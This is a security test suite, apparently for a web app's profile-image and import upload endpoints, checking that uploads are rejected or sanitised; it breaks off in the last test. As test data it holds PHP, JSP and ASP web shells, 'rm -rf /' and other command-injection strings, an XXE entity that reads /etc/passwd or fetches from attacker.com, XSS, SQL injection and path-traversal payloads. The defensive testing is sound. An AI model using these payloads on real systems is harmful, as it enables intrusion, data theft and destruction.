/**
 * File Upload Security Tests
 *
 * Comprehensive security test suite focusing on file upload vulnerabilities
 * including malicious file uploads, path traversal, and content validation.
 *
 * Test Categories:
 * 1. File Type Validation (15 tests)
 * 2. Malicious Content Detection (15 tests)
 * 3. Path Traversal Prevention (10 tests)
 * 4. File Size and Resource Limits (5 tests)
 * 5. Metadata and EXIF Security (5 tests)
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import request from 'supertest';
import { app } from '../../server/index';
import { storage } from '../../server/storage';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';

describe('File Upload Security Tests', () => {
  let validAdminToken: string;
  let validTrainerToken: string;
  let validCustomerToken: string;

  // Test credentials
  const testCredentials = {
    admin: { email: 'admin@test.com', password: 'AdminPass123!', role: 'admin' },
    trainer: { email: 'trainer@test.com', password: 'TrainerPass123!', role: 'trainer' },
    customer: { email: 'customer@test.com', password: 'CustomerPass123!', role: 'customer' }
  };

  // Malicious file types and extensions
  const maliciousFileTypes = [
    { ext: '.exe', mime: 'application/x-msdownload', content: 'MZ\x90\x00' },
    { ext: '.bat', mime: 'application/x-bat', content: '@echo off\necho "malicious"' },
    { ext: '.sh', mime: 'application/x-sh', content: '#!/bin/bash\necho "malicious"' },
    { ext: '.php', mime: 'application/x-php', content: '<?php system($_GET["cmd"]); ?>' },
    { ext: '.jsp', mime: 'application/x-jsp', content: '<%@ page import="java.io.*" %>' },
    { ext: '.asp', mime: 'application/x-asp', content: '<%=Server.CreateObject("WScript.Shell").Exec("cmd /c dir")%>' },
    { ext: '.js', mime: 'application/javascript', content: 'require("child_process").exec("rm -rf /")' },
    { ext: '.py', mime: 'application/x-python', content: 'import os; os.system("rm -rf /")' },
    { ext: '.pl', mime: 'application/x-perl', content: 'system("rm -rf /");' },
    { ext: '.rb', mime: 'application/x-ruby', content: 'system("rm -rf /")' }
  ];

  // Web shell payloads disguised as images
  const webShellPayloads = [
    {
      filename: 'shell.php.jpg',
      content: '\xFF\xD8\xFF\xE0\x00\x10JFIF<?php system($_GET["cmd"]); ?>',
      mime: 'image/jpeg'
    },
    {
      filename: 'shell.jsp.png',
      content: '\x89PNG\r\n\x1a\n<%@ page import="java.io.*" %>',
      mime: 'image/png'
    },
    {
      filename: 'shell.asp.gif',
      content: 'GIF89a<%=Server.CreateObject("WScript.Shell")%>',
      mime: 'image/gif'
    }
  ];

  beforeAll(async () => {
    // Clean setup
    await storage.deleteFrom('users').execute();

    // Create test users
    for (const [role, creds] of Object.entries(testCredentials)) {
      await request(app)
        .post('/api/auth/register')
        .send(creds);
    }

    // Get valid tokens
    const adminLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: testCredentials.admin.email, password: testCredentials.admin.password });
    validAdminToken = adminLogin.body.token;

    const trainerLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: testCredentials.trainer.email, password: testCredentials.trainer.password });
    validTrainerToken = trainerLogin.body.token;

    const customerLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: testCredentials.customer.email, password: testCredentials.customer.password });
    validCustomerToken = customerLogin.body.token;
  });

  afterAll(async () => {
    await storage.deleteFrom('users').execute();
  });

  describe('File Type Validation Tests', () => {
    it('should reject executable file uploads (1/50)', async () => {
      for (const maliciousFile of maliciousFileTypes.slice(0, 3)) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(maliciousFile.content), `malicious${maliciousFile.ext}`)
          .field('description', 'Test upload');

        expect(response.status).toBeOneOf([400, 415, 422]);

        if (response.body.message) {
          expect(response.body.message).toMatch(/file.*type|format|extension|not.*allowed/i);
        }
      }
    });

    it('should validate MIME type vs file extension consistency (2/50)', async () => {
      const mismatchedFiles = [
        { filename: 'image.jpg', content: 'This is not an image', mime: 'text/plain' },
        { filename: 'document.pdf', content: '<html><script>alert("xss")</script></html>', mime: 'text/html' },
        { filename: 'archive.zip', content: '<?php echo "web shell"; ?>', mime: 'application/x-php' }
      ];

      for (const file of mismatchedFiles) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(file.content), file.filename);

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should reject double file extensions (3/50)', async () => {
      const doubleExtensionFiles = [
        'image.jpg.php',
        'document.pdf.exe',
        'archive.zip.bat',
        'photo.png.jsp',
        'file.txt.sh'
      ];

      for (const filename of doubleExtensionFiles) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), filename);

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should validate file magic numbers/signatures (4/50)', async () => {
      const fakeImageFiles = [
        {
          filename: 'fake.jpg',
          content: '<?php system($_GET["cmd"]); ?>',
          mime: 'image/jpeg'
        },
        {
          filename: 'fake.png',
          content: '<script>alert("xss")</script>',
          mime: 'image/png'
        },
        {
          filename: 'fake.gif',
          content: 'This is not a GIF file',
          mime: 'image/gif'
        }
      ];

      for (const file of fakeImageFiles) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(file.content), file.filename);

        expect(response.status).toBeOneOf([400, 415, 422]);

        if (response.body.message) {
          expect(response.body.message).toMatch(/invalid.*format|corrupted|magic.*number/i);
        }
      }
    });

    it('should reject script files with image extensions (5/50)', async () => {
      for (const webShell of webShellPayloads) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(webShell.content), webShell.filename);

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should validate allowed file extensions whitelist (6/50)', async () => {
      const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'];
      const disallowedExtensions = [
        '.svg', '.tiff', '.ico', '.psd', '.raw', '.ai', '.eps'
      ];

      // Test valid extensions should work (if file content is valid)
      for (const ext of allowedExtensions.slice(0, 2)) {
        const validContent = ext === '.jpg' || ext === '.jpeg'
          ? '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xFF\xDB'
          : '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x01\x00\x00\x00\x007n\xf9$';

        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(validContent), `test${ext}`);

        expect(response.status).toBeOneOf([200, 201, 400, 415, 422]);
      }

      // Test disallowed extensions should fail
      for (const ext of disallowedExtensions.slice(0, 3)) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), `test${ext}`);

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should prevent null byte injection in filenames (7/50)', async () => {
      const nullByteFilenames = [
        'image.jpg\x00.php',
        'safe.png\x00.exe',
        'document.pdf\x00.bat'
      ];

      for (const filename of nullByteFilenames) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), filename);

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should validate case-insensitive file extensions (8/50)', async () => {
      const caseVariations = [
        'script.PHP',
        'executable.EXE',
        'shell.Jsp',
        'malware.BAT'
      ];

      for (const filename of caseVariations) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('malicious content'), filename);

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should reject files with no extension (9/50)', async () => {
      const noExtensionFiles = [
        'noextension',
        'malicious',
        'script',
        'executable'
      ];

      for (const filename of noExtensionFiles) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('content without extension'), filename);

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should validate Content-Type header against file content (10/50)', async () => {
      const contentTypeSpoofing = [
        {
          filename: 'malicious.txt',
          content: '<?php system($_GET["cmd"]); ?>',
          contentType: 'image/jpeg'
        },
        {
          filename: 'script.js',
          content: 'alert("xss")',
          contentType: 'image/png'
        }
      ];

      for (const file of contentTypeSpoofing) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .set('Content-Type', 'multipart/form-data')
          .attach('file', Buffer.from(file.content), {
            filename: file.filename,
            contentType: file.contentType
          });

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should prevent polyglot file attacks (11/50)', async () => {
      // Files that are valid in multiple formats
      const polyglotFiles = [
        {
          filename: 'polyglot.jpg',
          // Valid JPEG header followed by HTML
          content: '\xFF\xD8\xFF\xE0\x00\x10JFIF<html><script>alert("xss")</script></html>',
          mime: 'image/jpeg'
        },
        {
          filename: 'polyglot.gif',
          // Valid GIF header followed by PHP
          content: 'GIF89a<?php system($_GET["cmd"]); ?>',
          mime: 'image/gif'
        }
      ];

      for (const file of polyglotFiles) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(file.content), file.filename);

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should validate archive file contents (12/50)', async () => {
      // Test ZIP files containing malicious content
      const maliciousArchives = [
        'archive-with-exe.zip',
        'archive-with-php.tar',
        'archive-with-scripts.rar'
      ];

      for (const filename of maliciousArchives) {
        // Create a simple ZIP-like structure
        const maliciousZip = 'PK\x03\x04malicious.exe';

        const response = await request(app)
          .post('/api/admin/import')
          .set('Authorization', `Bearer ${validAdminToken}`)
          .attach('file', Buffer.from(maliciousZip), filename);

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should prevent Unicode filename attacks (13/50)', async () => {
      const unicodeFilenames = [
        'image\u202ejpg.php', // Right-to-left override
        'file\uFEFFmalicious.exe', // Zero-width no-break space
        'document\u200Bscript.js', // Zero-width space
        'safe\u061Cphp.jpg' // Arabic letter mark
      ];

      for (const filename of unicodeFilenames) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), filename);

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should validate symbolic links in uploads (14/50)', async () => {
      // Test symlink detection (platform dependent)
      const symlinkTests = [
        {
          filename: 'symlink.txt',
          content: '/etc/passwd',
          isSymlink: true
        }
      ];

      for (const test of symlinkTests) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(test.content), test.filename);

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should enforce specific image dimensions and formats (15/50)', async () => {
      // Test various image format edge cases
      const imageTests = [
        {
          filename: 'huge.jpg',
          content: '\xFF\xD8\xFF\xE0\x00\x10JFIF', // Minimal JPEG
          expectedSize: '99999x99999'
        },
        {
          filename: 'tiny.png',
          content: '\x89PNG\r\n\x1a\n',
          expectedSize: '1x1'
        }
      ];

      for (const test of imageTests) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(test.content), test.filename);

        expect(response.status).toBeOneOf([200, 201, 400, 422]);
      }
    });
  });

  describe('Malicious Content Detection Tests', () => {
    it('should detect embedded scripts in image files (16/50)', async () => {
      const scriptEmbeddedImages = [
        {
          filename: 'script.jpg',
          content: '\xFF\xD8\xFF\xE0\x00\x10JFIF<script>alert("xss")</script>',
          mime: 'image/jpeg'
        },
        {
          filename: 'script.png',
          content: '\x89PNG\r\n\x1a\n<script>document.location="http://attacker.com"</script>',
          mime: 'image/png'
        }
      ];

      for (const file of scriptEmbeddedImages) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(file.content), file.filename);

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should detect virus signatures in uploads (17/50)', async () => {
      const virusSignatures = [
        'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*', // EICAR test virus
        '\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff', // PE header
        '\x7f\x45\x4c\x46' // ELF header
      ];

      for (const signature of virusSignatures) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(signature), 'suspicious.jpg');

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should scan for malicious URLs in file metadata (18/50)', async () => {
      const maliciousUrls = [
        'http://malware.com/payload.exe',
        'https://phishing-site.net/steal-data',
        'ftp://attacker.org/backdoor',
        'javascript:alert("xss")'
      ];

      for (const url of maliciousUrls) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), 'test.jpg')
          .field('sourceUrl', url);

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should detect PHP web shells (19/50)', async () => {
      const phpWebShells = [
        '<?php system($_GET["cmd"]); ?>',
        '<?php eval($_POST["code"]); ?>',
        '<?php exec($_REQUEST["command"]); ?>',
        '<?=`$_GET[0]`?>',
        '<?php file_get_contents($_GET["file"]); ?>'
      ];

      for (const shell of phpWebShells) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(shell), 'webshell.jpg');

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should detect JSP web shells (20/50)', async () => {
      const jspWebShells = [
        '<%@ page import="java.io.*" %><%=request.getParameter("cmd")%>',
        '<%Runtime.getRuntime().exec(request.getParameter("c"));%>',
        '<%@ page import="java.util.*,java.io.*"%>'
      ];

      for (const shell of jspWebShells) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(shell), 'webshell.png');

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should detect ASP web shells (21/50)', async () => {
      const aspWebShells = [
        '<%eval request("cmd")%>',
        '<%=Server.CreateObject("WScript.Shell").Exec(Request("c")).StdOut.ReadAll()%>',
        '<%execute(request("code"))%>'
      ];

      for (const shell of aspWebShells) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(shell), 'webshell.gif');

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should detect embedded JavaScript (22/50)', async () => {
      const jsPayloads = [
        'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
        'document.write("<script>alert(1)</script>")',
        'window.location="http://attacker.com"',
        'new Function("alert(1)")()'
      ];

      for (const payload of jsPayloads) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(payload), 'malicious.jpg');

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should detect SQL injection in filenames (23/50)', async () => {
      const sqlInjectionFilenames = [
        "'; DROP TABLE users; --.jpg",
        "' OR 1=1 --.png",
        "'; INSERT INTO admin VALUES('hacker', 'password'); --.gif",
        "' UNION SELECT password FROM users --.jpeg"
      ];

      for (const filename of sqlInjectionFilenames) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), filename);

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should detect command injection patterns (24/50)', async () => {
      const commandInjectionPatterns = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& whoami',
        '`id`',
        '$(uname -a)',
        '|| ping -c 10 127.0.0.1'
      ];

      for (const pattern of commandInjectionPatterns) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(pattern), 'malicious.jpg');

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should detect LDAP injection patterns (25/50)', async () => {
      const ldapInjectionPatterns = [
        '*)(uid=*',
        '*)(|(password=*))',
        '*))%00',
        '*)(&(objectClass=*)',
        '*)(objectClass=*)'
      ];

      for (const pattern of ldapInjectionPatterns) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), 'test.jpg')
          .field('description', pattern);

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should detect server-side template injection (26/50)', async () => {
      const sstiPatterns = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '{{config}}',
        '${this.constructor.constructor("alert(1)")()}'
      ];

      for (const pattern of sstiPatterns) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), 'test.jpg')
          .field('caption', pattern);

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should detect XML external entity (XXE) payloads (27/50)', async () => {
      const xxePayloads = [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">',
        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
      ];

      for (const payload of xxePayloads) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(payload), 'malicious.svg');

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should detect deserialization payloads (28/50)', async () => {
      const deserializationPayloads = [
        'O:8:"stdClass":1:{s:4:"test";s:4:"evil";}', // PHP
        'rO0ABXQACmV2aWwgY2xhc3M=', // Java serialized (base64)
        'BZh91AY&SY', // Python pickle
        'aced0005' // Java serialized (hex)
      ];

      for (const payload of deserializationPayloads) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(payload), 'serialized.jpg');

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should detect cryptocurrency mining scripts (29/50)', async () => {
      const cryptoMiningPatterns = [
        'coinhive',
        'crypto-loot',
        'webminerpool',
        'WS.onopen',
        'stratum+tcp',
        'CoinHive.Anonymous'
      ];

      for (const pattern of cryptoMiningPatterns) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(`script with ${pattern} mining`), 'miner.jpg');

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });

    it('should detect encoded malicious content (30/50)', async () => {
      const encodedPayloads = [
        'eval(atob("YWxlcnQoMSk="))', // base64 encoded alert(1)
        'eval(String.fromCharCode(97,108,101,114,116,40,49,41))', // char code
        '%65%76%61%6c%28%31%29', // URL encoded eval(1)
        '&#101;&#118;&#97;&#108;&#40;&#49;&#41;' // HTML entities
      ];

      for (const payload of encodedPayloads) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(payload), 'encoded.jpg');

        expect(response.status).toBeOneOf([400, 415, 422]);
      }
    });
  });

  describe('Path Traversal Prevention Tests', () => {
    it('should prevent directory traversal in filenames (31/50)', async () => {
      const pathTraversalFilenames = [
        '../../../etc/passwd.jpg',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts.png',
        '....//....//....//etc/passwd.gif',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd.jpeg',
        '..%252f..%252f..%252fetc%252fpasswd.jpg'
      ];

      for (const filename of pathTraversalFilenames) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), filename);

        expect(response.status).toBeOneOf([400, 422]);

        if (response.body.message) {
          expect(response.body.message).toMatch(/invalid.*filename|path|traversal/i);
        }
      }
    });

    it('should prevent absolute path injection (32/50)', async () => {
      const absolutePaths = [
        '/etc/passwd.jpg',
        '/var/www/html/shell.php.png',
        'C:\\Windows\\System32\\evil.exe.gif',
        '/home/user/.ssh/id_rsa.jpeg',
        '/proc/self/environ.jpg'
      ];

      for (const filepath of absolutePaths) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), path.basename(filepath));

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should sanitize upload directory paths (33/50)', async () => {
      const maliciousDirectories = [
        '../uploads',
        '../../public',
        '../../../server',
        '..\\uploads',
        '%2e%2e%2fuploads'
      ];

      for (const dir of maliciousDirectories) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), 'test.jpg')
          .field('directory', dir);

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should prevent symlink attacks in upload paths (34/50)', async () => {
      // Test various symlink-related attacks
      const symlinkTests = [
        {
          filename: 'symlink.jpg',
          path: '../../../etc/passwd'
        },
        {
          filename: 'link.png',
          path: '/etc/shadow'
        }
      ];

      for (const test of symlinkTests) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), test.filename)
          .field('targetPath', test.path);

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should validate upload destination security (35/50)', async () => {
      const dangerousDestinations = [
        '/var/www/html/',
        '/etc/',
        '/usr/bin/',
        'C:\\Windows\\System32\\',
        '/home/user/.ssh/'
      ];

      for (const destination of dangerousDestinations) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), 'test.jpg')
          .field('uploadPath', destination);

        expect(response.status).toBeOneOf([400, 403, 422]);
      }
    });

    it('should prevent race condition attacks in file operations (36/50)', async () => {
      // Attempt concurrent uploads to same filename
      const promises = Array.from({ length: 10 }, (_, i) =>
        request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(`content ${i}`), 'concurrent.jpg')
      );

      const responses = await Promise.all(promises);

      // Should handle concurrent uploads safely
      const successfulUploads = responses.filter(r => r.status === 200 || r.status === 201);
      expect(successfulUploads.length).toBeLessThanOrEqual(1);
    });

    it('should prevent filename collision attacks (37/50)', async () => {
      const collisionFilenames = [
        'test.jpg',
        'test.jpg',
        'TEST.JPG',
        'test.Jpg',
        'tëst.jpg' // Unicode normalization
      ];

      const responses = [];
      for (const filename of collisionFilenames) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), filename);

        responses.push(response);
      }

      // Should handle filename collisions properly
      const successfulUploads = responses.filter(r => r.status === 200 || r.status === 201);
      expect(successfulUploads.length).toBeLessThanOrEqual(collisionFilenames.length);
    });

    it('should validate temporary file handling (38/50)', async () => {
      // Test if temporary files are properly cleaned up
      const tempFileTests = [
        'temp_file.tmp.jpg',
        '.temporary.jpg',
        'cache_file.jpg'
      ];

      for (const filename of tempFileTests) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('temp content'), filename);

        expect(response.status).toBeOneOf([200, 201, 400, 422]);
      }
    });

    it('should prevent backup file access (39/50)', async () => {
      const backupFilenames = [
        'backup.sql.jpg',
        'database.bak.png',
        'config.backup.gif',
        'app.config~.jpeg'
      ];

      for (const filename of backupFilenames) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('backup content'), filename);

        expect(response.status).toBeOneOf([400, 422]);
      }
    });

    it('should secure file deletion operations (40/50)', async () => {
      // Test secure file deletion
      const response = await request(app)
        .delete('/api/profile/image')
        .set('Authorization', `Bearer ${validCustomerToken}`)
        .send({
          filename: '../../../important-file.jpg'
        });

      expect(response.status).toBeOneOf([200, 400, 403, 404, 422]);
    });
  });

  describe('File Size and Resource Limits Tests', () => {
    it('should enforce maximum file size limits (41/50)', async () => {
      // Create large file content
      const largeContent = Buffer.alloc(50 * 1024 * 1024, 'A'); // 50MB

      const response = await request(app)
        .post('/api/profile/image')
        .set('Authorization', `Bearer ${validCustomerToken}`)
        .attach('file', largeContent, 'large.jpg');

      expect(response.status).toBeOneOf([413, 422]);

      if (response.body.code) {
        expect(response.body.code).toBe('PAYLOAD_TOO_LARGE');
      }
    });

    it('should prevent zip bomb attacks (42/50)', async () => {
      // Simulate zip bomb (highly compressed malicious file)
      const zipBombContent = 'PK\x03\x04' + 'A'.repeat(1000); // Fake ZIP structure

      const response = await request(app)
        .post('/api/admin/import')
        .set('Authorization', `Bearer ${validAdminToken}`)
        .attach('file', Buffer.from(zipBombContent), 'bomb.zip');

      expect(response.status).toBeOneOf([400, 413, 422]);
    });

    it('should limit concurrent file uploads (43/50)', async () => {
      // Test concurrent upload limits
      const promises = Array.from({ length: 20 }, (_, i) =>
        request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from(`content ${i}`), `concurrent${i}.jpg`)
      );

      const responses = await Promise.all(promises);

      // Should rate limit or reject some uploads
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should enforce storage quota limits (44/50)', async () => {
      // Test user storage quotas
      const responses = [];

      for (let i = 0; i < 10; i++) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('content'.repeat(1000)), `quota${i}.jpg`);

        responses.push(response);

        if (response.status === 413 || response.status === 507) {
          break; // Storage quota reached
        }
      }

      // Should eventually hit storage limits
      const quotaExceeded = responses.some(r => r.status === 413 || r.status === 507);
      expect(quotaExceeded || responses.length === 10).toBe(true);
    });

    it('should prevent resource exhaustion attacks (45/50)', async () => {
      // Test rapid successive uploads
      const rapidUploads = Array.from({ length: 50 }, (_, i) =>
        request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('small content'), `rapid${i}.jpg`)
      );

      const responses = await Promise.all(rapidUploads);

      // Should implement some form of rate limiting
      const rateLimited = responses.filter(r => r.status === 429 || r.status === 503);
      expect(rateLimited.length).toBeGreaterThan(0);
    });
  });

  describe('Metadata and EXIF Security Tests', () => {
    it('should strip dangerous EXIF data (46/50)', async () => {
      // Test EXIF data that could contain malicious content
      const maliciousExifData = {
        comment: '<script>alert("xss")</script>',
        software: '<?php system($_GET["cmd"]); ?>',
        artist: 'javascript:alert(1)',
        description: '; rm -rf /'
      };

      for (const [field, value] of Object.entries(maliciousExifData)) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('fake image content'), 'test.jpg')
          .field(`exif_${field}`, value);

        expect(response.status).toBeOneOf([200, 201, 400, 422]);

        if (response.status === 200 || response.status === 201) {
          // Verify EXIF data was sanitized
          const imageResponse = await request(app)
            .get('/api/profile/image')
            .set('Authorization', `Bearer ${validCustomerToken}`);

          if (imageResponse.status === 200) {
            const responseText = JSON.stringify(imageResponse.body);
            expect(responseText).not.toContain('<script>');
            expect(responseText).not.toContain('<?php');
            expect(responseText).not.toContain('javascript:');
          }
        }
      }
    });

    it('should prevent GPS coordinate leakage (47/50)', async () => {
      const gpsData = {
        latitude: '40.7128',
        longitude: '-74.0060',
        altitude: '10.5'
      };

      const response = await request(app)
        .post('/api/profile/image')
        .set('Authorization', `Bearer ${validCustomerToken}`)
        .attach('file', Buffer.from('image with gps'), 'gps_image.jpg')
        .field('gps_data', JSON.stringify(gpsData));

      if (response.status === 200 || response.status === 201) {
        // Verify GPS data was stripped
        const imageResponse = await request(app)
          .get('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`);

        if (imageResponse.status === 200) {
          const responseText = JSON.stringify(imageResponse.body);
          expect(responseText).not.toContain('40.7128');
          expect(responseText).not.toContain('-74.0060');
        }
      }
    });

    it('should sanitize file metadata fields (48/50)', async () => {
      const maliciousMetadata = {
        title: '<img src=x onerror=alert(1)>',
        description: '"; DROP TABLE users; --',
        keywords: 'javascript:alert("xss")',
        author: '$(whoami)'
      };

      for (const [field, value] of Object.entries(maliciousMetadata)) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), 'metadata.jpg')
          .field(field, value);

        expect(response.status).toBeOneOf([200, 201, 400, 422]);
      }
    });

    it('should prevent metadata injection attacks (49/50)', async () => {
      const injectionPayloads = [
        'normal\x00injected',
        'normal\r\ninjected: malicious',
        'normal\nX-Malicious: header',
        'normal\x0binjected'
      ];

      for (const payload of injectionPayloads) {
        const response = await request(app)
          .post('/api/profile/image')
          .set('Authorization', `Bearer ${validCustomerToken}`)
          .attach('file', Buffer.from('test content'), 'injection.jpg')
          .field('title', payload);

        expect(response.status).toBeOneOf([200, 201, 400, 422]);
      }
    });

    it('should handle oversized metadata gracefully (50/50)', async () => {
      const oversizedMetadata = {
        title: 'A'.repeat(10000),
        description: 'B'.repeat(50000),
